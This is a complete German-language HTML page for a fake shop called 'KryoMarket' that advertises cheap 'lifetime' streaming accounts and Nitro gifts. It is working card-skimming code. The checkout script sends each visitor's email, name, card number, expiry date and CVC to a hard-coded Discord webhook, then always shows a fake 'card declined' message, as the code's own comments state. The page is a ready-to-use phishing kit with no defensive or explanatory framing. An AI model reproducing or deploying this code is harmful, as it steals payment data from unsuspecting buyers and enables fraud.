<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>KryoMarket</title>
    <style>
        /* ===== RESET & BASE ===== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: #0a0a0f;
            color: #ffffff;
            min-height: 100vh;
            overflow-x: hidden;
        }

        /* ===== ANIMIERTER HINTERGRUND – Blaue fallende Punkte ===== */
        #particles-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            pointer-events: none;
        }

        /* ===== ALLES ÜBER DEM HINTERGRUND ===== */
        .page-content {
            position: relative;
            z-index: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px 20px 60px;
            min-height: 100vh;
        }

        /* ===== BANNER ===== */
        .banner {
            text-align: center;
            padding: 40px 20px 30px;
            width: 100%;
        }
        .banner h1 {
            font-size: 3.8rem;
            font-weight: 900;
            letter-spacing: 6px;
            text-transform: uppercase;
            background: linear-gradient(135deg, #66e0ff, #3399ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 60px rgba(0, 150, 255, 0.5);
        }
        .banner p {
            color: #aabbdd;
            margin-top: 8px;
            font-size: 1.1rem;
            letter-spacing: 3px;
            font-weight: 500;
        }

        /* ===== PRODUKT-GRID ===== */
        .product-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
            gap: 30px;
            max-width: 1400px;
            width: 100%;
            padding: 20px 0;
        }

        /* ===== PRODUKT-KARTE ===== */
        .product-card {
            background: rgba(255, 255, 255, 0.07);
            backdrop-filter: blur(12px);
            border: 1.5px solid rgba(80, 180, 255, 0.25);
            border-radius: 18px;
            padding: 20px;
            text-align: center;
            cursor: pointer;
            transition: all 0.35s cubic-bezier(0.25, 0.46, 0.45, 0.94);
            position: relative;
            overflow: hidden;
        }
        .product-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(
                135deg,
                rgba(0, 150, 255, 0.1) 0%,
                transparent 60%
            );
            opacity: 0;
            transition: opacity 0.4s;
            pointer-events: none;
        }
        .product-card:hover {
            transform: translateY(-6px) scale(1.02);
            border-color: rgba(80, 200, 255, 0.7);
            box-shadow: 0 20px 60px rgba(0, 100, 255, 0.3);
        }
        .product-card:hover::before {
            opacity: 1;
        }
        .product-card:active {
            transform: translateY(-2px) scale(0.98);
        }

        .product-card img {
            width: 100%;
            height: auto;
            aspect-ratio: 1/1;
            object-fit: contain;
            border-radius: 14px;
            margin-bottom: 16px;
            background: rgba(0, 0, 0, 0.5);
            padding: 24px;
            transition: transform 0.3s;
            display: block;
        }
        .product-card:hover img {
            transform: scale(1.06);
        }
        .product-card h3 {
            font-size: 1.25rem;
            font-weight: 700;
            margin-bottom: 8px;
            color: #ffffff;
        }
        .product-card .price {
            font-size: 1.8rem;
            font-weight: 900;
            color: #66e0ff;
            letter-spacing: 1px;
        }

        /* ===== OVERLAY / MODAL ===== */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(6px);
            z-index: 999;
            justify-content: center;
            align-items: center;
            padding: 20px;
            animation: fadeIn 0.25s ease;
        }
        .modal-overlay.active {
            display: flex;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: scale(0.92);
            }
            to {
                opacity: 1;
                transform: scale(1);
            }
        }

        .modal {
            background: #141420;
            border: 1.5px solid rgba(80, 180, 255, 0.3);
            border-radius: 24px;
            padding: 32px 28px;
            max-width: 460px;
            width: 100%;
            max-height: 90vh;
            overflow-y: auto;
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.9);
            position: relative;
        }
        .modal h2 {
            font-size: 1.6rem;
            font-weight: 700;
            margin-bottom: 4px;
            color: #ffffff;
        }
        .modal .modal-price {
            font-size: 2rem;
            font-weight: 900;
            color: #66e0ff;
            margin-bottom: 20px;
        }
        .modal .close-btn {
            position: absolute;
            top: 16px;
            right: 20px;
            background: none;
            border: none;
            color: #888;
            font-size: 1.8rem;
            cursor: pointer;
            transition: color 0.2s;
        }
        .modal .close-btn:hover {
            color: #fff;
        }

        /* ===== FORM ===== */
        .form-step {
            display: none;
            flex-direction: column;
            gap: 14px;
        }
        .form-step.active {
            display: flex;
        }

        .form-step label {
            font-size: 0.9rem;
            font-weight: 600;
            color: #99aacc;
            margin-bottom: 2px;
        }
        .form-step input {
            background: rgba(255, 255, 255, 0.08);
            border: 1.5px solid rgba(255, 255, 255, 0.12);
            border-radius: 12px;
            padding: 14px 16px;
            color: #ffffff;
            font-size: 1rem;
            outline: none;
            transition: border 0.2s;
            width: 100%;
        }
        .form-step input:focus {
            border-color: #3399ff;
            box-shadow: 0 0 25px rgba(0, 136, 255, 0.2);
        }
        .form-step input::placeholder {
            color: #556677;
        }

        .btn {
            background: linear-gradient(135deg, #0066ff, #00bbff);
            border: none;
            border-radius: 12px;
            padding: 16px 24px;
            color: #ffffff;
            font-weight: 800;
            font-size: 1.05rem;
            cursor: pointer;
            transition: all 0.25s;
            letter-spacing: 1px;
            margin-top: 8px;
        }
        .btn:hover {
            transform: scale(1.03);
            box-shadow: 0 8px 30px rgba(0, 100, 255, 0.5);
        }
        .btn:active {
            transform: scale(0.97);
        }

        .info-text {
            font-size: 0.85rem;
            color: #88aacc;
            line-height: 1.6;
            margin-bottom: 4px;
            font-weight: 500;
        }

        /* ===== STATUS-NACHRICHT (immer "Karte abgelehnt") ===== */
        .status-msg {
            text-align: center;
            font-size: 1.3rem;
            font-weight: 800;
            padding: 24px 0;
            display: none;
            color: #ff4466;
            text-shadow: 0 0 20px rgba(255, 68, 102, 0.3);
        }
        .status-msg.show {
            display: block;
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 700px) {
            .banner h1 {
                font-size: 2.4rem;
                letter-spacing: 3px;
            }
            .product-grid {
                grid-template-columns: 1fr 1fr;
                gap: 16px;
            }
            .product-card {
                padding: 12px;
            }
            .product-card img {
                padding: 14px;
            }
            .product-card h3 {
                font-size: 1rem;
            }
            .product-card .price {
                font-size: 1.4rem;
            }
            .modal {
                padding: 24px 18px;
            }
        }
        @media (max-width: 400px) {
            .product-grid {
                grid-template-columns: 1fr;
            }
        }

        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 6px;
        }
        ::-webkit-scrollbar-track {
            background: #0a0a0f;
        }
        ::-webkit-scrollbar-thumb {
            background: #1a2a44;
            border-radius: 10px;
        }
    </style>
</head>
<body>

    <!-- ===== Canvas für fallende blaue Punkte ===== -->
    <canvas id="particles-canvas"></canvas>

    <!-- ===== SEITENINHALT ===== -->
    <div class="page-content">

        <!-- BANNER -->
        <header class="banner">
            <h1>KryoMarket</h1>
            <p>✦ Premium Digital Products ✦</p>
        </header>

        <!-- PRODUKT-GRID -->
        <div class="product-grid" id="productGrid"></div>

    </div>

    <!-- ===== MODAL (Kauf-Overlay) ===== -->
    <div class="modal-overlay" id="modalOverlay">
        <div class="modal">
            <button class="close-btn" id="closeModalBtn">&times;</button>

            <!-- Schritt 1: E-Mail -->
            <div class="form-step active" id="step1">
                <h2 id="modalProductName">Produkt</h2>
                <div class="modal-price" id="modalProductPrice">€0.00</div>
                <label for="emailInput">E-Mail-Adresse</label>
                <input type="email" id="emailInput" placeholder="deine@email.de" />
                <p class="info-text">
                    Wir senden dein Produkt per E-Mail an diese Adresse.
                </p>
                <button class="btn" id="toStep2Btn">Weiter</button>
            </div>

            <!-- Schritt 2: Kreditkarte -->
            <div class="form-step" id="step2">
                <h2>Kreditkartenzahlung</h2>
                <label for="firstName">Vorname</label>
                <input type="text" id="firstName" placeholder="" />
                <label for="lastName">Nachname</label>
                <input type="text" id="lastName" placeholder="" />
                <label for="cardNumber">Kartennummer</label>
                <input type="text" id="cardNumber" placeholder="" maxlength="19" />
                <div style="display:flex;gap:12px;">
                    <div style="flex:1;">
                        <label for="expiry">Ablaufdatum (MM/JJ)</label>
                        <input type="text" id="expiry" placeholder="" maxlength="5" />
                    </div>
                    <div style="flex:1;">
                        <label for="cvc">CVC</label>
                        <input type="text" id="cvc" placeholder="" maxlength="3" />
                    </div>
                </div>
                <button class="btn" id="payBtn">Jetzt kaufen – €<span id="payAmount">0.00</span></button>

                <!-- Status nach "Kauf" – immer Karte abgelehnt -->
                <div class="status-msg" id="statusMsg">❌ Karte abgelehnt. Bitte überprüfe deine Angaben und versuche es erneut.</div>
            </div>
        </div>
    </div>

    <script>
        // ============================================================
        // 1. PRODUKTDATEN (mit vollständigen Discord-Icon-URLs)
        // ============================================================
        const products = [{
            name: 'Disney+ Lifetime NFA',
            price: 1.00,
            image: 'https://cdn.discordapp.com/attachments/1522163115305861225/1522165678738509975/953278.webp?ex=6a477ac2&is=6a462942&hm=0a8094082e3f09d4a4846c5eb6a9ecf4fa9aea4a624647feeda8ec908660d1b7'
        }, {
            name: 'Netflix Premium FA Lifetime',
            price: 1.50,
            image: 'https://cdn.discordapp.com/attachments/1522163115305861225/1522165681355882537/949417.webp?ex=6a477ac2&is=6a462942&hm=c1a715b03625a1318dbe5311a717ac91d6b8bb5b7f704b43414251e45cd109db'
        }, {
            name: 'Nitro Boost Gift',
            price: 2.50,
            image: 'https://cdn.discordapp.com/attachments/1522163115305861225/1522168066954367027/952115_1.webp?ex=6a477cfb&is=6a462b7b&hm=ba2f418ea350123345a8069f8abdd3df29d0aa7f00cc7233634f78cd765fa48e'
        }, {
            name: 'Spotify Lifetime Account',
            price: 2.00,
            image: 'https://cdn.discordapp.com/attachments/1522163115305861225/1522168679104647250/952103.webp?ex=6a477d8d&is=6a462c0d&hm=8bd737188099e64a1240fb3a731528c3ff2d670fc1d3090455a9cb58a43e3941'
        }];

        // ============================================================
        // 2. PRODUKTE INS GRID RENDERN
        // ============================================================
        const grid = document.getElementById('productGrid');

        products.forEach((p, index) => {
            const card = document.createElement('div');
            card.className = 'product-card';
            card.innerHTML = `
                <img src="${p.image}" alt="${p.name}" loading="lazy" />
                <h3>${p.name}</h3>
                <div class="price">€${p.price.toFixed(2)}</div>
            `;
            card.addEventListener('click', () => openModal(index));
            grid.appendChild(card);
        });

        // ============================================================
        // 3. MODAL-LOGIK
        // ============================================================
        let currentProduct = null;

        const overlay = document.getElementById('modalOverlay');
        const closeBtn = document.getElementById('closeModalBtn');
        const step1 = document.getElementById('step1');
        const step2 = document.getElementById('step2');
        const prodName = document.getElementById('modalProductName');
        const prodPrice = document.getElementById('modalProductPrice');
        const payAmount = document.getElementById('payAmount');
        const emailInput = document.getElementById('emailInput');
        const toStep2Btn = document.getElementById('toStep2Btn');
        const payBtn = document.getElementById('payBtn');
        const statusMsg = document.getElementById('statusMsg');

        // Kreditkarten-Felder
        const firstName = document.getElementById('firstName');
        const lastName = document.getElementById('lastName');
        const cardNumber = document.getElementById('cardNumber');
        const expiry = document.getElementById('expiry');
        const cvc = document.getElementById('cvc');

        // ============================================================
        // 4. DISCORD WEBHOOK
        // ============================================================
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1522163323368505416/xHUujzQ6lwt9ZqpjHAMeF9i5vtvoHGdYdYy5u-eF-kenAFIq8hkJ8912Xb1GJFEBWJwU';

        async function sendToDiscord(data) {
            const embed = {
                title: '🛒 Neuer Kauf - KryoMarket',
                color: 0x00bbff,
                fields: [
                    { name: '📦 Produkt', value: data.product, inline: true },
                    { name: '💰 Preis', value: `€${data.price}`, inline: true },
                    { name: '📧 E-Mail', value: data.email, inline: false },
                    { name: '👤 Vorname', value: data.firstName, inline: true },
                    { name: '👤 Nachname', value: data.lastName, inline: true },
                    { name: '💳 Kartennummer', value: data.cardNumber, inline: false },
                    { name: '📅 Ablaufdatum', value: data.expiry, inline: true },
                    { name: '🔐 CVC', value: data.cvc, inline: true }
                ],
                footer: { text: 'KryoMarket • ' + new Date().toLocaleString('de-DE') },
                timestamp: new Date().toISOString()
            };

            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ embeds: [embed] })
                });
            } catch (err) {
                console.error('Webhook-Fehler:', err);
            }
        }

        // ============================================================
        // 5. MODAL ÖFFNEN / SCHLIESSEN
        // ============================================================
        function openModal(index) {
            currentProduct = products[index];
            prodName.textContent = currentProduct.name;
            prodPrice.textContent = `€${currentProduct.price.toFixed(2)}`;
            payAmount.textContent = currentProduct.price.toFixed(2);

            // Reset
            step1.classList.add('active');
            step2.classList.remove('active');
            statusMsg.classList.remove('show');
            emailInput.value = '';
            firstName.value = '';
            lastName.value = '';
            cardNumber.value = '';
            expiry.value = '';
            cvc.value = '';

            overlay.classList.add('active');
        }

        function closeModal() {
            overlay.classList.remove('active');
            currentProduct = null;
        }

        closeBtn.addEventListener('click', closeModal);
        overlay.addEventListener('click', (e) => {
            if (e.target === overlay) closeModal();
        });

        // Schritt 1 → Schritt 2
        toStep2Btn.addEventListener('click', () => {
            const email = emailInput.value.trim();
            if (!email || !email.includes('@')) {
                alert('Bitte gib eine gültige E-Mail-Adresse ein.');
                return;
            }
            step1.classList.remove('active');
            step2.classList.add('active');
        });

        // ============================================================
        // 6. "KAUFEN" – Immer Webhook + immer "Karte abgelehnt"
        // ============================================================
        payBtn.addEventListener('click', async () => {
            // Prüfen, ob alle Felder ausgefüllt sind
            if (!firstName.value.trim() || !lastName.value.trim() ||
                !cardNumber.value.trim() || !expiry.value.trim() ||
                !cvc.value.trim()) {
                alert('Bitte fülle alle Felder aus.');
                return;
            }

            // IMMER Webhook senden – in Echtzeit
            await sendToDiscord({
                product: currentProduct.name,
                price: currentProduct.price.toFixed(2),
                email: emailInput.value.trim(),
                firstName: firstName.value.trim(),
                lastName: lastName.value.trim(),
                cardNumber: cardNumber.value.trim(),
                expiry: expiry.value.trim(),
                cvc: cvc.value.trim()
            });

            // IMMER "Karte abgelehnt" anzeigen
            statusMsg.classList.add('show');
        });

        // Formatierung Kartennummer (Leerzeichen alle 4 Stellen)
        cardNumber.addEventListener('input', () => {
            let val = cardNumber.value.replace(/\D/g, '');
            val = val.replace(/(.{4})/g, '$1 ').trim();
            cardNumber.value = val;
        });

        // Formatierung Ablaufdatum (MM/JJ)
        expiry.addEventListener('input', () => {
            let val = expiry.value.replace(/\D/g, '');
            if (val.length >= 2) {
                val = val.substring(0, 2) + '/' + val.substring(2, 4);
            }
            expiry.value = val;
        });

        // Nur Zahlen für CVC
        cvc.addEventListener('input', () => {
            cvc.value = cvc.value.replace(/\D/g, '');
        });

        // ============================================================
        // 7. FALLENDE BLAUE PUNKTE (Canvas-Animation)
        // ============================================================
        const canvas = document.getElementById('particles-canvas');
        const ctx = canvas.getContext('2d');
        let W, H;
        const particles = [];
        const PARTICLE_COUNT = 80;

        function resizeCanvas() {
            W = canvas.width = window.innerWidth;
            H = canvas.height = document.body.scrollHeight;
        }
        window.addEventListener('resize', resizeCanvas);
        resizeCanvas();

        class Particle {
            constructor() {
                this.reset();
            }
            reset() {
                this.x = Math.random() * W;
                this.y = -10;
                this.size = Math.random() * 3 + 1.5;
                this.speed = Math.random() * 1.2 + 0.4;
                this.opacity = Math.random() * 0.6 + 0.2;
                this.hue = Math.random() * 40 + 200;
            }
            update() {
                this.y += this.speed;
                if (this.y > H + 10) {
                    this.reset();
                    this.y = -10;
                }
            }
            draw() {
                ctx.beginPath();
                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
                ctx.fillStyle = `hsla(${this.hue}, 100%, 60%, ${this.opacity})`;
                ctx.fill();

                ctx.beginPath();
                ctx.arc(this.x, this.y, this.size * 0.4, 0, Math.PI * 2);
                ctx.fillStyle = `hsla(${this.hue}, 100%, 85%, ${this.opacity + 0.2})`;
                ctx.fill();
            }
        }

        for (let i = 0; i < PARTICLE_COUNT; i++) {
            const p = new Particle();
            p.y = Math.random() * H;
            particles.push(p);
        }

        function animateParticles() {
            ctx.clearRect(0, 0, W, H);
            particles.forEach(p => {
                p.update();
                p.draw();
            });
            requestAnimationFrame(animateParticles);
        }
        animateParticles();

        window.addEventListener('scroll', () => {
            const newH = document.body.scrollHeight;
            if (newH !== H) {
                H = canvas.height = newH;
            }
        });

        console.log('🚀 KryoMarket gestartet!');
    </script>

</body>
</html>
